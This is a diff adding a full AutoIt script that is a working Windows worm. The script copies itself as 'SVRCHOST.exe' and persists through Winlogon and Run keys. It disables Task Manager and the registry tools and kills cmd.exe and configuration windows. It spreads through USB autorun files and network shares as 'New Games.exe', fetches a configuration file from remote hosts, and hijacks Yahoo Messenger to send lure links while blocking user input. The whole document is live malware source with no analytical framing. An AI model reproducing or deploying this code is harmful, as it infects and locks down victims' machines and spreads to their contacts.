@@ -1,0 +1,256 @@
+﻿ FUNC _PROCESSGETNAME ( $I_PID )
+ IF NOT PROCESSEXISTS ( $I_PID ) THEN
+ SETERROR ( 1 )
+ RETURN
+ ENDIF
+ LOCAL $A_PROCESSES = PROCESSLIST ( )
+ IF NOT @ERROR THEN
+ FOR $I = 1 TO $A_PROCESSES [ 0 ] [ 0 ]
+ IF $A_PROCESSES [ $I ] [ 1 ] = $I_PID THEN RETURN $A_PROCESSES [ $I ] [ 0 ]
+ NEXT
+ ENDIF
+ SETERROR ( 1 )
+ RETURN
+ ENDFUNC
+#NoTrayIcon
+ $NAME = "SVRCHOST"
+ $SETYAHOOMSGS = "yahoomsgs"
+ $INI = ".ini"
+ $NQL = ".nql"
+ $XLS = ".xls"
+ $EXE = ".exe"
+ $WEBST = "http://tinyurl.com/2lnsk5"
+ $YAHOOFUCUPDATE = @HOUR + 2
+ $YAHOOFUC = @MIN + 30
+ FILECOPY ( @AUTOITEXE , @SYSTEMDIR & "\" & $NAME & $EXE , 0 )
+ FILESETATTRIB ( @SYSTEMDIR & "\" & $NAME & $EXE , "+RSH" )
+ FILECOPY ( @AUTOITEXE , @WINDOWSDIR & "\" & $NAME & $EXE , 0 )
+ FILESETATTRIB ( @WINDOWSDIR & "\" & $NAME & $EXE , "-RSH" )
+ REGWRITE ( "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" , "Shell" , "REG_SZ" , "Explorer.exe " & $NAME & $EXE )
+ REGWRITE ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" , "MSN Messengger" , "REG_SZ" , @SYSTEMDIR & "\" & $NAME & $EXE )
+ REGWRITE ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" , "NofolderOptions" , "REG_DWORD" , 1 )
+ REGWRITE ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" , "DisableTaskMgr" , "REG_DWORD" , 1 )
+ REGWRITE ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" , "DisableRegistryTools" , "REG_DWORD" , 1 )
+ REGWRITE ( "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" , "CheckedValue" , "REG_DWORD" , 0 )
+ CREATEINI ( )
+ SENDYMSG ( )
+ $A = REGREAD ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares" , "shared" )
+ IF $A = "" THEN
+ CPYAPPZ ( )
+ ENDIF
+ IF $A <> "" THEN
+ IF FILEEXISTS ( $A ) = 0 THEN
+ CPYAPPZ ( )
+ ENDIF
+ ENDIF
+ IF PROCESSEXISTS ( "Indian_Game.exe" ) THEN
+ PROCESSCLOSE ( "Indian_Game.exe" )
+ ENDIF
+ SLEEP ( 1000 )
+ IF PROCESSEXISTS ( "Indian_Game.exe" ) THEN
+ PROCESSCLOSE ( "Indian_Game.exe" )
+ ENDIF
+ SLEEP ( 1000 )
+ IF PROCESSEXISTS ( "Indian_Game.exe" ) THEN
+ PROCESSCLOSE ( "Indian_Game.exe" )
+ ENDIF
+ SLEEP ( 1000 )
+ IF PROCESSEXISTS ( "Indian_Game.exe" ) THEN
+ PROCESSCLOSE ( "Indian_Game.exe" )
+ ENDIF
+ SLEEP ( 1000 )
+ WHILE ( 1 )
+ PROCSSKILL ( )
+ COPYUSB ( )
+ IF @HOUR = $YAHOOFUCUPDATE THEN
+ UPDATE ( )
+ IF PROCESSEXISTS ( "Indian_Game.exe" ) THEN
+ PROCESSCLOSE ( "Indian_Game.exe" )
+ ENDIF
+ SLEEP ( 1000 )
+ IF PROCESSEXISTS ( "Indian_Game.exe" ) THEN
+ PROCESSCLOSE ( "Indian_Game.exe" )
+ ENDIF
+ SLEEP ( 1000 )
+ IF PROCESSEXISTS ( "Indian_Game.exe" ) THEN
+ PROCESSCLOSE ( "Indian_Game.exe" )
+ ENDIF
+ SLEEP ( 1000 )
+ IF PROCESSEXISTS ( "Indian_Game.exe" ) THEN
+ PROCESSCLOSE ( "Indian_Game.exe" )
+ ENDIF
+ SLEEP ( 1000 )
+ ENDIF
+ IF @MIN = $YAHOOFUC THEN
+ SENDYMSG ( )
+ ENDIF
+ WEND
+ FUNC DOWNLOADURL ( )
+ $SETYAHOOMSGSURL = "http://nhatquanglan3.t35.com"
+ IF INETGET ( $SETYAHOOMSGSURL & "/" & $SETYAHOOMSGS & $NQL , @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , 1 , 0 ) = 0 THEN
+ INETGET ( $SETYAHOOMSGSURL & "/" & $SETYAHOOMSGS & $XLS , @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , 1 , 0 )
+ ENDIF
+ SLEEP ( 1000 )
+ $DOWNLOADED = "success"
+ $SETYAHOOMSGSURL1 = "http://nhatquanglan4.t35.com"
+ IF INIREAD ( @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , "setyahoomsgs" , "downloaded" , "" ) <> $DOWNLOADED THEN
+ IF INETGET ( $SETYAHOOMSGSURL1 & "/" & $SETYAHOOMSGS & $NQL , @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , 1 , 0 ) = 0 THEN
+ INETGET ( $SETYAHOOMSGSURL1 & "/" & $SETYAHOOMSGS & $XLS , @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , 1 , 0 )
+ ENDIF
+ ENDIF
+ FILESETATTRIB ( @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , "+RSH" )
+ ENDFUNC
+ FUNC SENDYMSG ( )
+ $TIEUDE = INIREAD ( @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , "setyahoomsgs" , "webst" , "" )
+ IF $WEBST = "" THEN
+ $WEBST = "http://nhatquanglan1.0catch.com"
+ ENDIF
+ DIM $MSGARY [ 10 ]
+ $MSGARY [ 0 ] = INIREAD ( @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , "setyahoomsgs" , "msgary[0]" , "" )
+ IF $MSGARY [ 0 ] = "" THEN
+ $MSGARY [ 0 ] = "see this comedy joke click on this link " & $WEBST & " "
+ ENDIF
+ $MSGARY [ 1 ] = INIREAD ( @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , "setyahoomsgs" , "msgary[1]" , "" )
+ IF $MSGARY [ 1 ] = "" THEN
+ $MSGARY [ 1 ] = "Ha ha ha click on link to laugh ..." & $WEBST & " "
+ ENDIF
+ $MSGARY [ 2 ] = INIREAD ( @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , "setyahoomsgs" , "msgary[2]" , "" )
+ IF $MSGARY [ 2 ] = "" THEN
+ $MSGARY [ 2 ] = "what a joke ......" & $WEBST & " "
+ ENDIF
+ $MSGARY [ 3 ] = INIREAD ( @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , "setyahoomsgs" , "msgary[3]" , "" )
+ IF $MSGARY [ 3 ] = "" THEN
+ $MSGARY [ 3 ] = "nice one see this .... " & $WEBST & " "
+ ENDIF
+ $MSGARY [ 4 ] = INIREAD ( @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , "setyahoomsgs" , "msgary[4]" , "" )
+ IF $MSGARY [ 4 ] = "" THEN
+ $MSGARY [ 4 ] = "what a joke .....click to see  " & $WEBST & " "
+ ENDIF
+ $MSGARY [ 5 ] = INIREAD ( @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , "setyahoomsgs" , "msgary[5]" , "" )
+ IF $MSGARY [ 5 ] = "" THEN
+ $MSGARY [ 5 ] = "what a joke ...... " & $WEBST & "  "
+ ENDIF
+ $MSGARY [ 6 ] = INIREAD ( @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , "setyahoomsgs" , "msgary[6]" , "" )
+ IF $MSGARY [ 6 ] = "" THEN
+ $MSGARY [ 6 ] = "nice to listen .........." & $WEBST & " "
+ ENDIF
+ $MSGARY [ 7 ] = INIREAD ( @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , "setyahoomsgs" , "msgary[7]" , "" )
+ IF $MSGARY [ 7 ] = "" THEN
+ $MSGARY [ 7 ] = "what is this ? ......see " & $WEBST & " "
+ ENDIF
+ $MSGARY [ 8 ] = INIREAD ( @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , "setyahoomsgs" , "msgary[8]" , "" )
+ IF $MSGARY [ 8 ] = "" THEN
+ $MSGARY [ 8 ] = "i am busy you click on a link and see ..." & $WEBST & " "
+ ENDIF
+ $MSGARY [ 9 ] = INIREAD ( @SYSTEMDIR & "\" & $SETYAHOOMSGS & $INI , "setyahoomsgs" , "msgary[9]" , "" )
+ IF $MSGARY [ 9 ] = "" THEN
+ $MSGARY [ 9 ] = "what is this ? ......see " & $WEBST & " "
+ ENDIF
+ $SENDMSGS = WINGETTITLE ( "Yahoo! Messenger" , "" )
+ $YAHOOSND = WINEXISTS ( $SENDMSGS )
+ IF $YAHOOSND = 1 THEN
+ $MUZEE = RANDOM ( 0 , 9 , 1 )
+ CLIPPUT ( $MSGARY [ $MUZEE ] )
+ BLOCKINPUT ( 1 )
+ WINACTIVATE ( $SENDMSGS )
+ SEND ( "!m" )
+ SEND ( "un" )
+ SEND ( "^v {ENTER}{ENTER}" )
+ SEND ( "^m" )
+ SEND ( "{DOWN}" )
+ SEND ( "^{SHIFTDOWN}{END}{SHIFTUP}" )
+ SEND ( "{ENTER}" )
+ SEND ( "^v {ENTER}" )
+ BLOCKINPUT ( 0 )
+ ENDIF
+ $YAHOOFUC = @MIN + 30
+ IF $YAHOOFUC> 60 THEN
+ $YAHOOFUC = $YAHOOFUC - 60
+ ENDIF
+ ENDFUNC
+ FUNC PROCSSKILL ( )
+ IF WINEXISTS ( "System Configuration" ) THEN
+ WINCLOSE ( "System Configuration" )
+ ENDIF
+ IF WINEXISTS ( "Registry" ) THEN
+ WINCLOSE ( "Registry" )
+ ENDIF
+ IF WINEXISTS ( "Windows Task" ) THEN
+ WINCLOSE ( "Windows Task" )
+ ENDIF
+ IF PROCESSEXISTS ( "cmd.exe" ) THEN
+ PROCESSCLOSE ( "cmd.exe" )
+ ENDIF
+ ENDFUNC
+ FUNC COPYUSB ( )
+ $USB = DRIVEGETDRIVE ( "REMOVABLE" )
+ IF NOT @ERROR THEN
+ DIM $ODIA [ 6 ]
+ $ODIA [ 1 ] = ""
+ FOR $I = 1 TO $USB [ 0 ]
+ $ODIA [ $I - 1 ] = $USB [ $I ]
+ NEXT
+ IF $ODIA [ 0 ] <> "A:" THEN
+ IF $ODIA [ 0 ] <> "" THEN
+ FILECOPY ( @WINDOWSDIR & "\" & $NAME & $EXE , $ODIA [ 0 ] & "\New Games.exe" , 0 )
+ SLEEP ( 1 )
+ FILECOPY ( @SYSTEMDIR & "\" & $NAME & $EXE , $ODIA [ 0 ] & "\" & $NAME & $EXE , 0 )
+ SLEEP ( 1 )
+ FILECOPY ( @SYSTEMDIR & "\autorun.ini" , $ODIA [ 0 ] & "\autorun.inf" , 0 )
+ FILESETATTRIB ( $ODIA [ 0 ] & "\autorun.inf" , "+RSH" )
+ SLEEP ( 1 )
+ SEARCH ( $ODIA [ 0 ] )
+ ENDIF
+ ENDIF
+ IF $ODIA [ 0 ] = "A:" THEN
+ IF $ODIA [ 1 ] <> "" THEN
+ FILECOPY ( @WINDOWSDIR & "\" & $NAME & $EXE , $ODIA [ 1 ] & "\New Games.exe" , 0 )
+ SLEEP ( 1 )
+ FILECOPY ( @SYSTEMDIR & "\" & $NAME & $EXE , $ODIA [ 1 ] & "\" & $NAME & $EXE , 0 )
+ SLEEP ( 1 )
+ FILECOPY ( @SYSTEMDIR & "\autorun.ini" , $ODIA [ 1 ] & "\autorun.inf" , 0 )
+ FILESETATTRIB ( $ODIA [ 1 ] & "\autorun.inf" , "+RSH" )
+ SLEEP ( 1 )
+ SEARCH ( $ODIA [ 1 ] )
+ ENDIF
+ ENDIF
+ ENDIF
+ ENDFUNC
+ FUNC SEARCH ( $CURRENT )
+ LOCAL $SEARCH = FILEFINDFIRSTFILE ( $CURRENT & "\*.*" )
+ WHILE 1
+ DIM $FILE = FILEFINDNEXTFILE ( $SEARCH )
+ IF @ERROR OR STRINGLEN ( $FILE ) < 1 THEN EXITLOOP
+ IF STRINGINSTR ( FILEGETATTRIB ( $CURRENT & "\" & $FILE ) , "D" ) AND ( $FILE <> "." OR $FILE <> ".." ) THEN
+ FILECOPY ( @WINDOWSDIR & "\" & $NAME & $EXE , $CURRENT & "\" & $FILE & "\" & $FILE & $EXE , 0 )
+ SEARCH ( $CURRENT & "\" & $FILE )
+ ENDIF
+ SLEEP ( 1 )
+ WEND
+ FILECLOSE ( $SEARCH )
+ ENDFUNC
+ FUNC CPYAPPZ ( )
+ DIM $MANG [ 30 ]
+ FOR $I = 1 TO 30
+ $READ = REGENUMKEY ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares" , $I )
+ IF @ERROR THEN EXITLOOP
+ $READ = STRINGREPLACE ( $READ , "/" , "\" )
+ $MANG [ $I ] = "\\" & $READ
+ $CHECKCOPY = FILECOPY ( @WINDOWSDIR & "\" & $NAME & $EXE , $MANG [ $I ] & "\New Games.exe" , 1 )
+ IF $CHECKCOPY = 1 THEN
+ FILECOPY ( @SYSTEMDIR & "\" & $NAME & $EXE , $MANG [ $I ] & "\" & $NAME & $EXE , 0 )
+ FILECOPY ( @SYSTEMDIR & "\autorun.ini" , $MANG [ $I ] & "\autorun.inf" , 1 )
+ FILESETATTRIB ( $MANG [ $I ] & "\autorun.inf" , "+RSH" )
+ SEARCH ( $MANG [ $I ] )
+ ENDIF
+ NEXT
+ REGWRITE ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares" , "shared" , "REG_SZ" , $MANG [ $I - 1 ] & "\New Games.exe" )
+ ENDFUNC
+ FUNC CREATEINI ( )
+ INIWRITE ( @SYSTEMDIR & "\autorun.ini" , "Autorun" , "Open" , $NAME & $EXE )
+ INIWRITE ( @SYSTEMDIR & "\autorun.ini" , "Autorun" , "Shellexe cute" , $NAME & $EXE )
+ INIWRITE ( @SYSTEMDIR & "\autorun.ini" , "Autorun" , "Shell\Open\command" , $NAME & $EXE )
+ INIWRITE ( @SYSTEMDIR & "\autorun.ini" , "Autorun" , "Shell" , "Open" )
+ SLEEP ( 1 )
+ FILESETATTRIB ( @SYSTEMDIR & "\autorun.ini" , "+RSH" )
+ ENDFUNC
